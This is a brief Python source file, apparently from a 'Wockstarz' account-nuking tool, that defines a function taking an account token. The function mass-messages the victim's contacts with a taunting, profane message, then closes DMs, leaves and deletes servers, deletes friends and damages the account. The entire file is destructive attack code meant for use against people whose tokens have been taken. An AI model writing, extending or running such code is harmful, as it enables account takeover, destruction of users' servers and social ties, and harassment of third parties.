from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def Nuke_account(token):
    massDM(token, "✮✞ Whoops!!! Wockstarz fucked you, do better next time! ツ ✞✮")
    close_all_dms(token)
    leaveServer(token)
    deleteServers(token)
    deleteFriends(token)
    fuckAccount(token)